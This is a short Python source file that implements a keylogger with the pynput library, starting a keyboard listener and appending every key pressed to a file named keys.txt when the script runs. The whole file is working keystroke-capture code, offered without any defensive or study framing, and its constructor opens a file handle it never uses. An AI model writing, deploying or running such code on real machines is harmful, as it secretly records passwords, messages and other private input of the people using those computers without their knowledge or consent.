# -*- mode: python -*-
# -*- coding: utf-8 -*-

from pynput.keyboard import Listener, Key


class KeyLogger:
	def __init__(self, file_name):
		self.listener = Listener(on_press=self.record_key)
		self.file = open(file_name, 'a')


	def record_key(self, key):
		with open('keys.txt', 'a') as file:
			file.write(f'{key}\n')


	def setup(self):
		self.listener.start()

	def join(self):
		self.listener.join()


if __name__ == '__main__':
	key_logger = KeyLogger('keys.txt')
	key_logger.setup()
	key_logger.join()

